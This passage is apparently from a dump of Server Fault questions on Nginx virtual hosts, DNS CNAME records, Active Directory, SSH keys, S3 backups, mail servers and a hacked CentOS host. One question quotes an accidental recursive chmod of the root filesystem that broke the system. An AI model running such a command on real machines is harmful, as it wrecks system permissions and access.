<p>We need to have dynamic virtual hosts configurations for Nginx, so we came up with three options, mentioned below. </p>

<p>Need suggestion which one will be a right choice, as our website base is growing with 30 to 40 new websites per day and there are already 2000+ websites registered on the platform.</p>

<p>Any better option other than these will also be considered.   </p>

<blockquote>
  <p><strong><em>Mass Virtual Hosts Configurations</em></strong></p>
</blockquote>

<p>This can be achieved by making <code>server_name</code> dynamic using regex.</p>

<p><strong>Pros:</strong></p>

<ul>
<li>Single file, single virtual hosts. </li>
<li>No need to reload Nginx for every new domain registration. </li>
<li>Can incorporate any number of domains.</li>
</ul>

<p><strong>Cons:</strong></p>

<ul>
<li>Can lead to a DDoS attack if someone finds out that server is processing any domain request coming to it.</li>
<li>Can slow down response, as for every request database query will be performed to verify whether domain/subdomain exists with the platform. </li>
</ul>

<p><strong>Ways to overcoming issue:</strong> </p>

<ul>
<li>Caching like Memcache or Redis can be used to cache all the domains and subdomains, so there will be few database queries to check domain and subdomain existence (only in case of cache failure)</li>
<li>Using Cloudflare, which can help us with DDoS prevention.</li>
<li>Nginx can also be configured to block requests for certain IPs which send requests too often.</li>
<li>Certain Ip addresses and bots responsible for any kind of attack can also be blocked using bad bot blocker configurations.</li>
</ul>

<blockquote>
  <p><strong><em>Individual Virtual Hosts file configurations</em></strong></p>
</blockquote>

<p>A script, which on receiving a request for the new domain, will create virtual hosts in a separate file, make it available for Nginx, enable it and reload Nginx. </p>

<p><strong>Pros:</strong></p>

<ul>
<li>Separate Virtual Hosts for each new domain registered.</li>
<li>Allows only registered domains to be processed.</li>
</ul>

<p><strong>Cons:</strong></p>

<ul>
<li>Need to trigger script for every new domain registered, which will be run as sudo user/root user</li>
<li>Can lead to 1000+ files which need to be loaded by Nginx and processed.</li>
<li>For every new virtual host, Nginx needs to be reloaded.</li>
<li>Request handling and managing might become a hassle if too many domains are registered.</li>
</ul>

<p><strong>Ways to overcome issue:</strong></p>

<ul>
<li>Instead of multiple files, use a single file for all virtual hosts.</li>
</ul>

<blockquote>
  <p><strong><em>Single File multiple hosts configurations</em></strong></p>
</blockquote>

<p>A script, which on receiving a request for the new domain, will append new virtual hosts in the single file used by Nginx and reload Nginx.</p>

<p><strong>Pros:</strong></p>

<ul>
<li>Separate virtual hosts for each new domain registered.</li>
<li>Allows only registered domains to be processed.</li>
<li>Reduces the number of files for all virtual hosts to one.</li>
</ul>

<p><strong>Cons:</strong></p>

<ul>
<li>The file can become heavy because of too many virtual hosts entries.</li>
<li>Can slow down Nginx processing because of a number of virtual hosts to look from.</li>
<li>For every new virtual host, Nginx needs to be reloaded.</li>
</ul>

<p><strong>Ways to overcome issue:</strong></p>

<ul>
<li>Have No other solution than having mass virtual hosts.</li>
</ul>
","<nginx><virtualhost>","2017-09-23 12:51:17"
"995879","Http request with Python","<p>I am not to familiar with Python so I wanted to ask you for help. I am trying to make a Toolkit for Instagram so I need a method to log one in but I dont know how to make this request and with which url. So can you help me and show me a Tool to find out to which url I need to make which request. Thanks in advance.</p>
","<python><web>","2019-12-17 13:56:57"
"785261","Need to route mail to new mail address","<p>I have a massively over populated inbox that I need to kill. It is currently at 140GB and rising.</p>

<p>I have created a new mailbox, with a retention policy to stop it happening again. How do I send all new mail to the newly created inbox so that takes over receiving these mails and stops storing them in the old one? I will be deleting the huge mailbox after I've extracted the last years worth of emails so forwarding isn't an option. </p>
","<exchange-2010><mailbox>","2016-06-21 10:42:58"
"785327","Is offering the contents of a third party web site offline violating the law?","<p>I have developed a nice little app that crawls a bunch of newspaper web sites and makes their latest content available on my phone offline. It's basically a Pocket app that saves contents automatically, once a day. I am wondering: if I ever wanted to put my app online, would I be infringing any laws?</p>
","<web-crawler><offline-files><scraping>","2016-06-21 13:47:51"
"995948","Why does CNAME for a root domain conflict with most other records?","<p>As far as I understand, a CNAME record is served to retrieve only the A record of its destination. E.g.:</p>

<p>www.example.com CNAME domain.com</p>

<p>Here the DNS resolver will search for the A record (IP address) of domain.com.</p>

<p>It is not allowed by RFC to use the CNAME record for the bare domain name, although, technically, it is possible. Like here:</p>

<p>example.com CNAME domain.com</p>

<p>example.com MX mail.example.com
(MX will not work in this case)</p>

<p>However, I still don't understand how this record conflicts with other records like MX from the technical point of view and why the A record does not conflict, for instance. I guess I've missed something.</p>

<p>By the way, there are CNAME Flattening, ANAME or ALIAS records that have different implementations than the standard CNAME and they do not conflict with other records.</p>

<p>Could you explain?</p>
","<domain-name-system><domain><mx-record><cname-record><root>","2019-12-17 22:06:27"
"996013","How do CNAME Flattening, ANAME or ALIAS records work?","<p>I found explanations by Cloudflare and DNS Made Easy quite vague on the implementation of these records - it was something about IP address caching.</p>

<p>Do those records only retrieve A and AAAA records of a target domain name?</p>

<p>Could you explain in detail how it works during the DNS query and where those IP's are fetched from?</p>
","<domain-name-system><cname-record><cloudflare><alias>","2019-12-18 11:59:57"
"996019","Giving 775 permissions to all files in an unix system breaks it, why?","<p>After a failing a command on my Ubuntu virtual machine on Azure and adding a deadly space </p>

<pre><code> sudo chmod -R 775 / ps_democqrshooksusage/
</code></pre>

<p>I ended up setting (accidentally) every single file in the system with the permissions 775.</p>

<p>After that I could not SSH to my VM anymore (but the Azure Shell kept working), and I noticed I could not use <code>sudo</code> anymore as well. </p>

<p>From what I understand, permissions 775 means that the owner and the group of the owner can do whatever they want and the others can only read and execute the file. </p>

<p>So why did this break some key functionnalities ?</p>
","<ubuntu><permissions>","2019-12-18 12:56:21"
"996061","apt-get upgrade of google-cloud-sdk throwing errors","<p>I have not found a way to report these bugs when updating Google Cloud SDK via apt-get on Ubuntu 18.04, so posting them here.</p>

<pre><code>Setting up google-cloud-sdk (274.0.0-0) ...
Compiling platform/bq/third_party/yaml/lib3/__init__.py ...
File ""platform/bq/third_party/yaml/lib3/__init__.py"", line 284
class YAMLObject(metaclass=YAMLObjectMetaclass):
                          ^
SyntaxError: invalid syntax

...

Processing triggers for google-cloud-sdk (274.0.0-0) ...
Compiling platform/bq/third_party/yaml/lib3/__init__.py ...
  File ""platform/bq/third_party/yaml/lib3/__init__.py"", line 284
    class YAMLObject(metaclass=YAMLObjectMetaclass):
                              ^
SyntaxError: invalid syntax

Setting up google-cloud-sdk-app-engine-go (274.0.0-0) ...
Processing triggers for google-cloud-sdk (274.0.0-0) ...
Compiling platform/bq/third_party/yaml/lib3/__init__.py ...
  File ""platform/bq/third_party/yaml/lib3/__init__.py"", line 284
    class YAMLObject(metaclass=YAMLObjectMetaclass):
                              ^
SyntaxError: invalid syntax
</code></pre>
","<google-cloud-platform>","2019-12-18 17:18:19"
"785484","Group Policy Objects stopped applying to most security groups","<p>I have a Server 2008 R2 Domain with quite a few Group Policy Objects that should be applied to various OUs and security groups (Using security filtering).</p>

<p>I got reports from users that they were missing certain settings and things like mapped drives. When I started investigating the problem, I found that almost every single GPO in our domain has simply stopped being applied.</p>

<p>There are a few GPOs (Like the default domain policy) that are still being applied, and it looks like the one thing they have in common is that these policies are all applied to the 'Authenticated Users' builtin group. Whereas all other GPOs use security filtering on various other security groups.</p>

<p>I have run lots of RSOP tests (Planning and Logging) which both show that only the GPOs applied to 'Authenticated Users' are being run. The other GPOs don't even show up under the ""GPOs that were not applied ..."" section of gpresult. I have checked permissions, GPO inheritance, and a few other basic but common GPO problems, all of which seem fine. I tried creating a some brand new GPOs, and applying them to brand new security groups, however these were also not applied.</p>

<p>I have not noticed any other issues with Active Directory, authentication against these security groups for other functions (such as file permissions) all seem to be working as expected. </p>

<p>I'm at a total loss to explain why these GPOs just suddenly stopped getting applied, for no apparent reason. Does anyone have any ideas what might be going on, or how to continue troubleshooting?</p>
","<windows-server-2008><active-directory><group-policy>","2016-06-22 08:25:23"
"875259","Recurring HDD led blinking every 2 seconds in ext4","<p>I've installed a new motherboard and then I've noticed the HDD led is blinking every 2 seconds.
That just freaked me out! Why this recurring disk activity?
I was thinking my HDD was in constant use even with data=writeback and commit=60! smartctl doesn't helped me to figure it out! Tried to configure APM and others, nothing helped!</p>

<p>These links, and others, doesn't have any clues either:
<a href=""https://bbs.archlinux.org/viewtopic.php?id=174729"" rel=""nofollow noreferrer"">https://bbs.archlinux.org/viewtopic.php?id=174729</a>
<a href=""https://bbs.archlinux.org/viewtopic.php?id=212854"" rel=""nofollow noreferrer"">https://bbs.archlinux.org/viewtopic.php?id=212854</a></p>

<p>Please help! What may be causing this?</p>

<p>Thanks!</p>

<p>P.S.: I'm posting this for future reference. It took me 2 weeks to solve.</p>
","<linux><hard-drive>","2017-09-24 20:15:37"
"785541","Can a CNAME record not include www?","<p>My registrar tell me that I can't have a CNAME record that doesn't start with www. Is it true?</p>

<p>So I am using amazon ec2 with load balancing. the loadbalancer has a convoluted DNS name, and specifically tells you to use a CNAME to send requests to that DNS name, and not an A record.</p>

<blockquote>
  <p>myloadbalancer-1234567890.us-west-1.elb.amazonaws.com (A Record)</p>
  
  <p>Note: Because the set of IP addresses associated with a LoadBalancer can change over time, you should never create an ""A"" record with any specific IP address. If you want to use a friendly DNS name for your load balancer instead of the name generated by the Elastic Load Balancing service, you should create a CNAME record for the LoadBalancer DNS name, or use Amazon Route 53 to create a hosted zone. For more information, see Using Domain Names With Elastic Load Balancing.</p>
</blockquote>

<p>I purchased a domain. The registrar doesn't allow you to add records yourself, only by emailing them a request. So they set up a CNAME record</p>

<pre><code>mydomain.org  SOA 111  whatever
www.mydomain.org    CNAME   3596    myloadbalancer-1234567890.us-west-1.elb.amazonaws.com   
</code></pre>

<p>when I asked them why it doesn't work with <code>www</code>, the registrar answered that there is a technical prohibition to make a CNAME record without <code>www</code>. Is it true, or are they incompetent/lying and I should switch registrars?</p>
","<domain-name-system><cname-record>","2016-06-22 12:25:39"
"785589","How can i set my new ip adress? [Debian / Ubuntu]","<p>I have my own VPS at OVH and it comes with a default
ip address in France. So for geolocation needs, i bought one 
for in the UK. Now i have Ubuntu server 16.40 running, and i want to 
set my newly bought ip address as the default. Any clues on how to do this?</p>

<p>(yes im starting, want to learn this)</p>

<p>Google results does only give a 'failover' but i want it as default. 
Can you guys help me a bit on this one </p>
","<ubuntu><ip><vps><linux-networking><ovh>","2016-06-22 14:51:32"
"875374","Add RSA login access to a new linux user","<p>I have automatically created rsa connection for user ""root"" via hosting installation script.</p>

<p><strong>I just added two new users and my question is how to configure them in SSH to login with their rsa keys?</strong> Now when im trying to login with old root rsa-key but with new user name there appears <em>Server refused our key</em>.</p>

<p>I looked for this on stack but without help. For example I have a problem with finding ~/.ssh directory. My system is Debian 9.</p>

<p>Thank you in advance.</p>
","<ssh><debian><rsa>","2017-09-25 15:04:48"
"875392","How to get a signed powershell script on Windows without deprecated makecert.exe?","<p>I've followed the instructions here <a href=""https://serverfault.com/questions/824574/create-code-signing-certificate-on-windows-for-signing-powershell-scripts"">Create Code Signing Certificate on Windows for signing PowerShell scripts</a></p>

<p>but it doesn't work as I get this error:</p>

<pre><code>File C:\temp\script.ps1 cannot be loaded. A certificate chain processed, but terminated in a root certificate      
which is not trusted by the trust provider.
</code></pre>

<p>I tried just copying the created cert into both my user and the machine trusted publishers with no luck.</p>

<p>Google gives me: <a href=""https://4sysops.com/archives/sign-your-powershell-scripts-to-increase-security/"" rel=""nofollow noreferrer"">https://4sysops.com/archives/sign-your-powershell-scripts-to-increase-security/</a> </p>

<p>and the like but they're all needing to install the Windows 10 SDK. </p>

<p>I'm just trying to run <a href=""https://community.spiceworks.com/scripts/show/2998-adamj-clean-wsus?page=51"" rel=""nofollow noreferrer"">https://community.spiceworks.com/scripts/show/2998-adamj-clean-wsus?page=51</a> on my Server 2016 WSUS server without polluting it any more than necessary, but I can't change the Group Policy of needing powershell scripts to be AllSigned.</p>

<p>Help?</p>
","<powershell><self-signed-certificate>","2017-09-25 16:03:56"
"996274","How can I see the contents off a cfg file?","<p>I have some questions about the <code>.cfg</code> file format.</p>

<p>How can I open it and how can I edit the file so that it is still usable?</p>

<p>If I search on the internet for a <code>.cfg</code> file editor I didn't find anything usable.
I tried to edit it in <code>Notepad</code> or <code>Wordpad</code> it becomes unusable and if I use <code>Free File Viewer</code> I only can read it, but not editing.</p>

<p>Does anyone knows a good editor, so that the file is still usable after editing?</p>
","<extension>","2019-12-20 09:27:19"
"785713","How can I send bulk email to a single domain safely?","<p>There are instances where I need to send email blasts to a single domain such <code>users@somesite.com</code>. This list can be quite large at times. In nearly all cases it's a single email and I'll likely not be sending another to that domain. I've checked the CAN-SPAM Act and I seem to be in the clear as the emails are not considered ""commercial"". However, I want to reduce the risk of our mail server from getting blacklisted and virtually useless.</p>

<p>My thought is to setup my lists (I'm using a custom email system) to send a certain number at a time such as 200 an hour or something to that effect. I'm unclear if that's a viable solution and if so I'm trying to find out an acceptable send frequency.</p>
","<email><email-server>","2016-06-23 04:39:41"
"875446","Automatically turn off VPN for select website/IP","<p>Using a VPN for privacy and security on a Unix machine. There are a few sites that I can only access through my whitelisted IP for work. Is there a way to automatically turn off my VPN (or route traffic using my static IP) when accessing certain websites?  Hoping to do this outside of application settings and in config files.</p>
","<iptables><vpn><routing><unix><ip-routing>","2017-09-25 22:25:49"
"875480","New virtual environment deployment. Best practises","<p>Gentlemen, I'm setting a brand new virtual environment and I need some advice. Budget is extremely tight so I am planning to use WS 2016 Core, free StarWind for storage, Veeam Free for backups. It's my first time configuring a virtual enviornment, so the suggestions on components came from spiceworks:D Any advice and best practises are most welcome.</p>
","<virtualization>","2017-09-26 04:39:30"
"875485","How to set a time limit for VPN users?","<p>I've been commissioned by my boss to set up a lab for our customers that they can access via VPN. Each customers should have access to the lab for either 80 or 100 hours, depending on what they purchase. How can I do that? Is there a way to keep track of the time a user is connected via VPN and then close that connection once he or she reaches the time limit?</p>
","<vpn>","2017-09-26 04:59:59"
"785883","Wildcard certificate supporting both www and non-www domain","<p>I have a GeoTrust wildcard certificate installed on my website www.example.com.
It is working fine with <a href=""https://www.example.com"" rel=""nofollow noreferrer"">https://www.example.com</a> but it is not supporting <a href=""https://example.com"" rel=""nofollow noreferrer"">https://example.com</a>. It shows a security warning that your connection is not secure and in advances pane its showing that this certificate is supporting only three listed domains.
Could you please help me into this?</p>
","<apache-2.2><ssl-certificate>","2016-06-23 17:33:52"
"785893","What is a light-weight OS X server?","<p>After writing <code>foo.html</code> with some CSS and some JavaScript, I test it on Safari, Firefox, and Chrome, and see that all is well.</p>

<p>I'd now like to debug the files on iOS and Android.</p>

<p>What is the lightest weight server I can launch from the command line? I would like to run in the Terminal:</p>

<pre><code>&gt; runserver .
</code></pre>

<p>to be able subsequently to point browsers to, say, <code>http://192.168.5.2/foo.html</code> on either an Android or an iOS device on the local network, and see the file.</p>
","<mac-osx-server><html>","2016-06-23 18:41:05"
"996616","How do I upload in a batch large files to AWS S3?","<p>I want to do a backup of a Linux file server which has 1.4 TB of data to AWS S3 Standard - IA. Some of the files are large, over 100 MB, and I read that multipart should be used. How can I do this on the command line so it does a sync, but handles the larger files automatically?</p>

<p>For example, I want to backup all of /home and /root recursively.</p>
","<amazon-web-services><aws-cli>","2019-12-24 05:40:42"
"996681","What is the difference between samba and sssd?","<p>In my ubuntu workstation I use <code>/etc/samba/smb.conf</code> and <code>/etc/sssd/sssd.conf</code> with <code>/etc/krb5.conf</code> in order to join active directory on a corporate network.</p>

<pre class=""lang-sh prettyprint-override""><code>sudo service samba-ad-dc status
# inactive

sudo service sssd status
# active (running)
</code></pre>

<p>However I cannot yet tell what is the difference between samba and sssd. 
Can someone explain what are the differences between these two services and where do they overlap?</p>

<ul>
<li>Can sssd work even without samba. Does it directly read <code>smb.conf</code>? </li>
<li>How do they depend to each other?</li>
</ul>

<p>I have read the documentation, but I need a simpler explanation.</p>
","<ubuntu><active-directory><samba><sssd>","2019-12-24 16:37:51"
"786043","How to authenticate clients trying to access my website via my external IP address?","<p>I have made a ruby on rails app which is running on <code>0.0.0.0:3000</code>
I have also forwarded the port 3000 on my router so that it is accessible remotely via the internet.<br>
So, I can view the webapp by the following ways:<br>
1. <code>localhost:3000</code> on the machine on which the server is running on<br>
2. <code>192.168.0.100:3000</code> on any machine on the same LAN<br>
3. <code>&lt;my-external-ip&gt;:3000</code> on any machine connected to the internet</p>

<p>Now, how can I add a login authentication system such that whenever someone enters <code>&lt;my-external-ip&gt;:3000</code> on their browser, they have to enter a username and password before they can access the webapp. I know I can add an authentication system in my Ruby on Rails app, but I was hoping for a solution which does it 'before' the Rails layer.</p>

<p>I am completely new to this.</p>
","<linux><ubuntu><vpn><port-forwarding>","2016-06-24 12:15:05"
"786104","Apache htaccess redirect http/www to https/non-www","<p>To redirect from</p>

<pre><code> - http://www.domain.com
 - http://domain.com
 - https://www.domain.com
</code></pre>

<p>to <a href=""https://domain.com"" rel=""nofollow noreferrer"">https://domain.com</a></p>

<p>im using the following (apache)htaccess:</p>

<pre><code>&lt;IfModule mod_rewrite.c&gt;
   RewriteEngine On
   RewriteCond %{HTTPS} !=on
   RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
&lt;/IfModule&gt;

&lt;IfModule mod_rewrite.c&gt;
    RewriteEngine On
    RewriteCond %{HTTPS} !=on
    RewriteCond %{HTTP_HOST} ^www\.(.+)$ [NC]
    RewriteRule ^ https://%1%{REQUEST_URI} [R=301,L]
&lt;/IfModule&gt;

# BEGIN WordPress

&lt;IfModule mod_rewrite.c&gt;
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
&lt;/IfModule&gt;

# END WordPress
</code></pre>

<p>This works, but I think it's not the best way.
The first two sections would still be to combine, but I don't know how.</p>
","<apache-2.2><.htaccess><mod-rewrite>","2016-06-24 16:09:50"
"875780","Oracle-asm RHEL 5 Kernel Upgrade Instructions?","<p>What are the official instructions for upgrading the oracle-asm kernel drivers when performing a kernel update on RHEL 5? I can only find documentation on a clean install of oracle-asm which includes configuration. But its my understanding is that I have to:</p>

<ol>
<li>Shut down ASM and disable auto start of ASM upon boot</li>
<li>Patch the kernel and reboot</li>
<li>Download the kernel matching oracle-asm RPM package and install  </li>
<li>Make sure oracleasm-support and oracleasmlib RPMs are on the latest release</li>
<li>Startup ASM and re-enable auto start    </li>
<li>Reboot to make sure ASM comes up on its own.</li>
</ol>

<p>No further configuration is needed right? Is there anything I'm missing?</p>
","<rhel5><linux-kernel><oracle-asm>","2017-09-27 15:14:05"
"875836","How to install java-1.8.0-openjdk & java-1.8.0-openjdk-devel on CentOS-7","<p>i seem to have hit a wall trying to install openjdk-1.8.0 (&amp; -devel) on CentOS -7 and yum isn't able to find the package (No package java-1.8.0-openjdk available.)</p>

<p><a href=""http://mirror.centos.org/centos/7/updates/x86_64/Packages/"" rel=""nofollow noreferrer"">http://mirror.centos.org/centos/7/updates/x86_64/Packages/</a> not even from here.</p>

<pre><code>Loaded plugins: fastestmirror
Loading mirror speeds from cached hostfile
 * base: mirrors.tripadvisor.com
 * epel: s3-mirror-us-east-1.fedoraproject.org
 * extras: mirror.vtti.vt.edu
No package java-1.8.0-openjdk available.
Error: Nothing to do
</code></pre>

<p>CentOS-Base.repo:</p>

<pre><code>[base]
name=CentOS-$releasever - Base
mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra
#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/
gpgcheck=1
enabled=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7

#released updates 
[updates]
name=CentOS-$releasever - Updates
mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra
#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/
gpgcheck=1
enabled=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7

#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras
mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra
#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/
gpgcheck=1
enabled=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7

#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus
#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra
baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/
gpgcheck=1
enabled=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
</code></pre>

<p>more specifically on centos-release-7-4.1708.el7.centos.x86_64</p>
","<centos7><yum>","2017-09-27 20:35:16"
"786166","What kind of emulator can i use to learn Cisco Router Configuration?","<p>I am going through my CCNA materials. I came across this one topic called configuring the router. Now, i don't have a Cisco Router but i still want to go through the commands and see the results live. I can't manage a router as of now, so is there some sort of emulator that i can use to virtually configure the router and go through my lab exercises. Please help me out as my CCNA exam is approaching close.</p>
","<networking><cisco><router>","2016-06-24 22:17:55"
"875871","Centos 6 Server Hacked - File being generated","<p>I have 3 servers working as a proxy load balance. Someone has gained access to them and is somehow creating an index.html in my webroot containing advertisement and an iframe on my main index.php file.</p>

<p>I'm not sure how they are doing this because even if I delete the index.html file across all of the server I can return half a day later to see that it has been done again.</p>

<p>I noticed that there was a web shell script on the server and deleted it. I also changed sshd_config so that only one user is able to login and all other accounts can't. Somehow they are still accessing the servers and making these changes. History doesn't show anything.</p>

<p>I need to get this resolved ASAP.</p>

<p>Can anyone make any suggestions?</p>

<p>Thanks!</p>
","<linux><centos><unix>","2017-09-28 04:34:49"
"786245","Output multiple VM's to only 4 IP addresses ESXI","<p>I have set up a computer as an ESXI environment.  The system has 1 physical network port.  When I create network ports on my virtual machines, each gets an IP address assigned by my router.  I need to limit the number of IP's assigned by my router to the system to 4.  Is it possible to set up a virtual network that could allow groups of VM's to be routed to individual IP's for my router (and do port forwarding and such on the individual VM routers)?</p>

<p>My goal is the picture below:</p>

<p><a href=""https://i.sstatic.net/oiIL2.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/oiIL2.png"" alt=""enter image description here""></a></p>

<p>If this is not possible, what sort of hardware would be needed in order to achieve this?</p>
","<networking><vmware-esxi><virtual-network>","2016-06-25 16:38:16"
"786315","using umask to set default file settings","<p>I am setting default umask of linux box for the first time.  I log in as root user on a Centos 6 server. I want these default values:</p>

<pre><code>owner:  read/execute/write (7)
group:  read/execute (5)
other:  read (4)
</code></pre>

<p>To get umask value, I deduct targets from 777: 777-754 = 023</p>

<pre><code># umask 023
</code></pre>

<p>then do a double check</p>

<pre><code># umask -S
  u=rwx,g=rx,o=r
</code></pre>

<p>then create and display file permissions</p>

<pre><code># echo x &gt; testfile.txt
# ll | grep testfile.txt
  -rw-r--r--.  1 root   root           4 Jun 26 01:15 testfile.txt
</code></pre>

<p>which is not quite what I was expecting.</p>
","<linux><umask>","2016-06-26 04:46:34"
"786358","FQDN for server with various domians","<p>I have a question regarding setting the FQDN on a server, well, technically, a vserver that serves a variety of domains.</p>

<p>I have understood that the FQDN is a globally unique address that points to a specific computer/host in the internet. So, if I had a subdomain test for the domain domain.com then I could set my FQDN to test.domain.com if that server would serve solely to that subdomain.</p>

<p>Currently my FQDN is <strong>localhost.localdomain</strong> which seems like something that is a very bad idea. I am having issues with email responsiveness, I would not be surprised if my current FQDN has something to do with this.</p>

<p>My question is: What is the appropriate way to set a FQDN for a server that serves a variety of domains? I would think that the server should be given a FQDN by the company who runs the server. Can just pick any FQDN, no matter what?</p>

<p>I hope that you can shed some light on this matter...</p>
","<fqdn><plesk>","2016-06-26 13:57:09"
"786373","Dual Monitors with ESXi 6","<p>I have ESXi 6 running on a server (another PC which is a test) and I have various VMs there of the Linux and Windows variety.</p>

<p>I would like the VMs to use 2 or 3 of my monitors when accessing them - I'm currently using the vSphere client.</p>

<p>I have seen that some people use RDP to access the Windows machines but</p>

<p>(a) What about my Linux VMs</p>

<p>(b) I imagine this wouldn't be possible when they are configured to host only (no outward network interface connection)</p>

<p>I have tried changed the video card settings, auto-detect and specifying the amount of monitors and increasing the RAM but to no avail.</p>

<p>The reason I want this set up is to have various infrastructures and different specialized machines (for example, malware analysis) to play with.</p>
","<vmware-esxi>","2016-06-26 16:10:35"
"876031","Hyper-V VMs can't reach external network","<p>I run a small ESXi Homelab and all of my VMs run on the 10.0.0.x subnet, and this is bridged out to a switch where my local PC is connected to - so I have access to everything on the 10.0.0.x subnet.</p>

<p>All of my VMs can connect to the internet without issue. One of my VMs is running Hyper-V Server 2016 (the standalone, not Windows role) and is connected up to the network the same as all of the other VMs and can access the internet.</p>

<p>However, none of the Hyper-V VMs can reach the external network, despite being statically assigned IPs in their respective Network Configurations. All of the VMs are connected directly to an External Hyper-V Switch, which is connected to the Hyper-V Server NIC, which is connected to the 10.0.0.x LAN.</p>

<p>The VMs can reach 10.0.0.2 (Hyper-V Server IP) but nothing outside of this. The firewall is disabled on the machine I am trying to ping (and works from other ESXi VMs) but still doesn't work.</p>

<p>Occasionally when pinging I get the ""Destination Host Unreachable"" error in CMD.</p>
","<routing><vmware-esxi><hyper-v>","2017-09-28 21:08:27"
"997019","Where is the AWS S3 metadata stored written by s3cmd?","<p>I was looking for a AWS S3 solution for backing up a Linux file system so that it would preserve the timestamp and permissions. It appears that <code>s3cmd</code> allows this by writing this information to the metadata for the object (file) on AWS S3 in the metadata. </p>

<p>Where is the metadata stored exactly? Is it part of the content of the file? Is there any chance it would corrupt the file? I'm trying to determine if using <code>s3cmd</code> to accomplish this is a safe option.</p>
","<amazon-web-services><amazon-s3><s3cmd>","2019-12-29 13:56:15"
"786414","How to use influxdb as a datasource for elasticsearch?","<p>I have a usecase where I would like to store conversation (chat) history in influxdb but I would like to have search capability of this textual conversation history, for which I would like to use elasticsearch. </p>

<p>How should I use influxdb as a datasource for elasticsearch?</p>
","<elasticsearch>","2016-06-26 22:56:48"
"786424","Does it make sense to have a server dedicated to login?","<p>Since the login process itself involves an expensive hash, it also makes this part of any app vulnerable to (D)DOS attacks.</p>

<p>Is it a good idea to put the login portion of the app on it's own dedicated servers as one line of defense or are there equivalent and less expensive approaches?</p>

<p>Thanks in advance.</p>
","<security><ddos><denial-of-service><server-setup>","2016-06-27 01:30:56"
"876102","How to get list of macbooks that use office for mac in network","<p>on our network we have some macbooks that use office for mac. 
Mac's arent in the domain,but users are using exchange mailbox. 
Is there any way to list this computers? Maybe on the exchange site? Search for specific version of program? </p>
","<exchange><mac><microsoft-office><mailbox>","2017-09-29 08:59:04"
"876107","HTTP to HTTPS redirect failing","<p>When I navigate to <code>http://example.com</code> it correctly redirects to <code>https://example.com</code>.</p>

<p>The problem I'm having is that when I navigate to <code>http://example.com/sub/directory/page.htm</code> it redirects to <code>https://example.comsub/directory/page.htm</code>.</p>

<p>Why is it not redirecting to <code>https://example.com/sub/directory/page.htm</code>?</p>

<p>Here is the apache config:</p>

<pre><code>&lt;VirtualHost *:80&gt;
        ServerName example.com

        Redirect permanent / https://example.com/

&lt;/VirtualHost&gt;

&lt;IfModule mod_ssl.c&gt;

#NameVirtualHost *:443

&lt;VirtualHost *:443&gt;

        ServerName example.com

        [...]

        ProxyRequests Off
        ProxyPass               /          http://localhost:8444/
        ProxyPassReverse        /          http://localhost:8444/

&lt;/VirtualHost&gt;
</code></pre>

<p>The Apache version I am using:</p>

<pre><code>Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02
</code></pre>
","<linux><apache-2.4><http><redirect>","2017-09-29 09:35:01"
"876202","What is the best way to manage authentication for a large number of servers in a datacenter?","<p>I'm running a large number of servers (several hundreds) in a local datacenter. Currently most of them are Windows servers of various types, but more and more are Linux.</p>

<p>I would like to know what the best practice is for managing authentication on these servers for system administrators. I can deploy SSH keys to the Linux servers, and the Windows servers are domain members, but is it a better idea to use PAM to authenticate the Linux servers to the AD domain?</p>

<p>If I was running a completely homogeneous Linux environment, how would this answer change? Surely an AD domain wouldn't be reasonable if it were the <em>only</em> Windows machine?</p>
","<linux><windows><security>","2017-09-29 18:51:33"
"876244","ip route add local not working","<p>I'm trying use all my /64 block IPv6 IPs on my machine. I ran into this post on serverfault</p>

<p><a href=""https://serverfault.com/questions/209203/can-i-bind-a-large-block-of-addresses-to-an-interface"">Can I bind a (large) block of addresses to an interface?</a></p>

<p>I have a VPS from Vultr running Debian 9</p>

<p>Below is the image related to my IPv6 block</p>

<p><a href=""https://i.sstatic.net/iX9gA.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/iX9gA.png"" alt=""enter image description here""></a></p>

<p>I executed the following command</p>

<pre><code>ip route add local 2001:19f0:9002:a32::/64 dev lo
</code></pre>

<p>but I can not connect with any of the IPv6 IPs to ssh</p>
","<linux><debian><ipv6>","2017-09-30 04:51:38"
"876269","Sender verify failed","<p>I've got VPS server based on CentOS with DirectAdmin on it. Some of emails sending to me are bounced with message <code>&lt;receiver@example1.com&gt;: 550 Verification failed for &lt;sender@example2.com&gt; \r\n Sender verify failed</code>.</p>

<p>What can I do to allow this messages come to my email?</p>

<p>Some exim logs:</p>

<pre><code>2017-09-30 07:47:45 H=somecloudserver.com [xxx.xxx.xxx.xxx] sender verify fail for &lt;sender@example2.com&gt;: 
2017-09-30 07:47:45 H=somecloudserver.com [xxx.xxx.xxx.xxx] X=TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256 CV=no F=&lt;sender@example2.com&gt; rejected RCPT &lt;receiver@example1.com&gt;: Sender verify failed
2017-09-30 07:47:45 H=somecloudserver.com [xxx.xxx.xxx.xxx] incomplete transaction (QUIT) from &lt;sender@example2.com&gt;
</code></pre>
","<centos><exim>","2017-09-30 12:14:08"
